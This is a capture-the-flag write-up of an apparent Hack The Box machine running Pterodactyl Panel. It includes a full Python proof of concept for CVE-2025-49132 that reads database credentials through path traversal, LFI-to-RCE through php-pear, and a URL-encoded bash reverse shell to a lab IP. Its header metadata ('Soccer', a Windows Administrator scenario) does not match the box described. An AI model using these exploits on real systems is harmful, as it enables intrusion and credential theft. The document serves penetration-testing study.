---
title: "Soccer Writeup"
permalink: /Soccer/
box:
  machine_name: "Soccer"
  release: "17 Dec, 2022"
  retire: "10 Jun 2023"
  os: "Linux"
  base_points: "Easy [20]"
  difficulty_hist: "/assets/boxes/admin-diff.png"     # optional image
  radar: "/assets/boxes/admin-radar.png"              # optional image
  first_blood_user: "00:06:01 — NLTE (Guru)"
  first_blood_root: "00:09:06 — NLTE (Guru)"
  creator: "sau123 (Hacker)"
  machine_url: "https://www.hackthebox.com/machines/soccer"
  scenario: >
    As is common in real-life Windows pentests, you will start the Administrator
    box with credentials for the following account:
    **Username:** Olivia **Password:** ichliebedich
---
<style>
.box-card{border:1px solid #2c2c2c;border-radius:10px;padding:1rem 1rem .5rem;background:#121212;box-shadow:0 0 0 1px #000 inset;margin:1.5rem 0}
.box-card__header{display:flex;align-items:center;justify-content:space-between;border-bottom:1px solid #2c2c2c;padding-bottom:.5rem;margin-bottom:.75rem}
.box-card__title{margin:0;font-size:1.6rem;color:#58f87a;letter-spacing:.5px}
.box-card__cta{font-size:.9rem;text-decoration:none;border:1px solid #2c2c2c;padding:.25rem .5rem;border-radius:6px}
.box-grid{display:grid;gap:.25rem}
.box-row{display:grid;grid-template-columns:180px 1fr;gap:1rem;padding:.4rem 0;border-bottom:1px dashed #222}
.box-row:last-child{border-bottom:none}
.box-row>span:first-child{color:#f15;font-weight:700}
.box-row--stack{align-items:start}
.box-img{max-width:460px;width:100%;height:auto;border-radius:6px;border:1px solid #222}
.box-note{display:inline-block;background:#0f1a0f;border:1px solid #224822;padding:.6rem .7rem;border-radius:8px}
</style>

{% include box-info.html data=page.box name=page.title %}

# Enumeration
## Nmap Scan
```
┌──(kali㉿kali)-[~/HTB_Labs/season_10/pterodactyl]
└─$ nmap -sC -sV 10.129.222.108 -p- -T5
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-09 16:33 -0500
Nmap scan report for 10.129.222.108
Host is up (0.22s latency).
Not shown: 65156 filtered tcp ports (no-response), 375 filtered tcp ports (admin-prohibited)
PORT     STATE  SERVICE    VERSION
22/tcp   open   ssh        OpenSSH 9.6 (protocol 2.0)
| ssh-hostkey: 
|   256 a3:74:1e:a3:ad:02:14:01:00:e6:ab:b4:18:84:16:e0 (ECDSA)
|_  256 65:c8:33:17:7a:d6:52:3d:63:c3:e4:a9:60:64:2d:cc (ED25519)
80/tcp   open   http       nginx 1.21.5
|_http-title: Did not follow redirect to http://pterodactyl.htb/
|_http-server-header: nginx/1.21.5
443/tcp  closed https
8080/tcp closed http-proxy

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 384.20 seconds
```
## HTTP Server
Navigating to the web server shows what is seemingly a homepage for a minecraft server.
<img width="2254" height="883" alt="image" src="https://github.com/user-attachments/assets/688e2ebe-adc6-4e66-ac18-3908f6e902d4" />

We see that underneath the area where the IP is located, we see a changelog.
<img width="677" height="520" alt="image" src="https://github.com/user-attachments/assets/c457dedf-bc4e-43ed-a989-c34b035e72fa" />

There are a few things in this changelog that are important.
- The Pterodactyl Panel version. This is an outdated version of this application.
- PHP-RPM, PHP-pEAR, and phpinfo() are enabled.

Immediately phpinfo being enabled is a red flag, and we can confirm this is the case by navigating to the phpinfo.php directory. Once we get there we see that we can see the PHP version the website uses, and all useful settings we can use to get more information.
<img width="2258" height="1088" alt="image" src="https://github.com/user-attachments/assets/5ada8052-1669-4c27-8890-c119ca0f7513" />

However, for now we enumerate more.

Enumerating Directories and subdomains showed me no interesting directories (other than the changelog.txt file which we already found)
```
┌──(kali㉿kali)-[~/HTB_Labs/season_10/pterodactyl]
└─$ ffuf -w /home/kali/Custom_Wordlists/wordlists/wordlists/htb/subdomains.txt:FUZZ -u http://pterodactyl.htb -H "Host: FUZZ.pterodactyl.htb" -fs 145

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://pterodactyl.htb
 :: Wordlist         : FUZZ: /home/kali/Custom_Wordlists/wordlists/wordlists/htb/subdomains.txt
 :: Header           : Host: FUZZ.pterodactyl.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 145
________________________________________________

panel                   [Status: 200, Size: 1897, Words: 490, Lines: 36, Duration: 407ms]
[WARN] Caught keyboard interrupt (Ctrl-C)
```

Adding this subdomain to my host file, we see that this leads to the Pterodactyl panel we saw in the changelog file
<img width="2256" height="759" alt="image" src="https://github.com/user-attachments/assets/5347efab-8861-4c53-a348-4d7e3cb64035" />

Looking up if our version of Pterodactyl Panel is vulnerable, we see that there is a critical CVE (CVE-2025-49132) that leads unautheticated RCE.
https://pentest-tools.com/vulnerabilities-exploits/pterodactyl-panel-remote-code-execution_27317

Essentially, the /locales/locale.json file takes 2 inputs with parameters named `locale` and `namespace`. These parameters are improperly sanitized, allowing our raw input to be sent to the endpoint.

The code below shows one of the PoCs that are used to check for the vulnerability, which gets the database credentials from this application.
```
# Exploit Title: Pterodactyl Panel 1.11.11 - Remote Code Execution (RCE)
# Date: 22/06/2025
# Exploit Author: Zen-kun04
# Vendor Homepage: https://pterodactyl.io/
# Software Link: https://github.com/pterodactyl/panel
# Version: < 1.11.11
# Tested on: Ubuntu 22.04.5 LTS
# CVE: CVE-2025-49132


import requests
import json
import argparse
import colorama
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

arg_parser = argparse.ArgumentParser(
    description="Check if the target is vulnerable to CVE-2025-49132.")
arg_parser.add_argument("target", help="The target URL")
args = arg_parser.parse_args()

try:
    target = args.target.strip() + '/' if not args.target.strip().endswith('/') else args.target.strip()
    r = requests.get(f"{target}locales/locale.json?locale=../../../pterodactyl&namespace=config/database", allow_redirects=True, timeout=5, verify=False)
    if r.status_code == 200 and "pterodactyl" in r.text.lower():
        try:
            raw_data = r.json()
            data = {
                "success": True,
                "host": raw_data["../../../pterodactyl"]["config/database"]["connections"]["mysql"].get("host", "N/A"),
                "port": raw_data["../../../pterodactyl"]["config/database"]["connections"]["mysql"].get("port", "N/A"),
                "database": raw_data["../../../pterodactyl"]["config/database"]["connections"]["mysql"].get("database", "N/A"),
                "username": raw_data["../../../pterodactyl"]["config/database"]["connections"]["mysql"].get("username", "N/A"),
                "password": raw_data["../../../pterodactyl"]["config/database"]["connections"]["mysql"].get("password", "N/A")
            }
            print(f"{colorama.Fore.LIGHTGREEN_EX}{target} => {data['username']}:{data['password']}@{data['host']}:{data['port']}/{data['database']}{colorama.Fore.RESET}")
        except json.JSONDecodeError:
            print(colorama.Fore.RED + "Not vulnerable" + colorama.Fore.RESET)
        except TypeError:
            print(colorama.Fore.YELLOW + "Vulnerable but no database" + colorama.Fore.RESET)
    else:
        print(colorama.Fore.RED + "Not vulnerable" + colorama.Fore.RESET)
except requests.RequestException as e:
    if "NameResolutionError" in str(e):
        print(colorama.Fore.RED + "Invalid target or unable to resolve domain" + colorama.Fore.RESET)
    else:
        print(f"{colorama.Fore.RED}Request error: {e}{colorama.Fore.RESET}")
```

Remaking this in burpsuite, we can confirm that we get RCE via LFI.
<img width="1598" height="896" alt="image" src="https://github.com/user-attachments/assets/b59948ad-bda6-4d76-99f7-d4e1de20df1b" />

However, so far this by itself doesn't allow for RCE in a way that can give us a shell, so we enumerate further.

Going back to the `changelog.txt` file, I remember that php-pear was enabled, which is an open-source php package manager that has multiple critical vulnerabilities associated with it. One of these allow for RCE.

The article below shows methods that php pear is used to change LFI to command execution
https://medium.com/@lashin0x/local-file-inclusion-to-remote-code-execution-rce-bea0ec06342a

The payload to put a malicious php shell in the web directory so it is accessible via webpage
<img width="1592" height="809" alt="image" src="https://github.com/user-attachments/assets/4dd3bbbb-085d-4510-bc04-bdd4892772c9" />

Shows that in the root directory, we have command execution. It's messy but we see that we are the wwwrun user
<img width="2251" height="243" alt="image" src="https://github.com/user-attachments/assets/ba616767-a0b2-4315-a556-0dfcbb4b2b3e" />

We URL encoded a simple bash one liner to get a rev shell
`http://panel.pterodactyl.htb/pwn.php?cmd=bash%20-c%20'bash%20-i%20%3E%26%20/dev/tcp/10.10.14.91/9999%200%3E%261'`

rev shell
<img width="644" height="186" alt="image" src="https://github.com/user-attachments/assets/cd94a40a-b0b2-4935-a3ef-f5599af6703a" />

